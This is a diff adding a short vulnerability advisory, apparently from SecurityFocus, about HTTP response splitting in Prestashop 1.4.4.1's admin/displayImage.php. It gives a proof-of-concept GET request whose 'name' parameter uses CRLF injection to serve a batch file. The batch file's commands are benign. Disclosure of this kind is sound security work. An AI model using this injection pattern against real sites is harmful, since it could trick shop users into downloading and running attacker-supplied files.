@@ -1,0 +1,10 @@
+source: http://www.securityfocus.com/bid/50785/info
+
+Prestashop is prone to an HTTP-response-splitting vulnerability because it fails to sufficiently sanitize user-supplied data.
+
+Attackers can leverage this issue to influence or misrepresent how web content is served, cached, or interpreted. This could aid various attacks that try to entice client users into a false sense of trust.
+
+Prestashop 1 4.4.1 is vulnerable; other versions may also be affected. 
+
+GET: http://www.example.com/admin/displayImage.php?img=<name_of_existing_file_in_md5_format>&name=asa.cmd"%0d%0a%0d%0a@echo off%0d%0aecho running batch file%0d%0apause%0d%0aexit
+Note: The <name_of_existing_file_in_md5_format> is the name of one file existing on the "upload/" folder. It&#039;s name must be a MD5 hash, without any extension. ex: "435ed7e9f07f740abf511a62c00eef6e" 
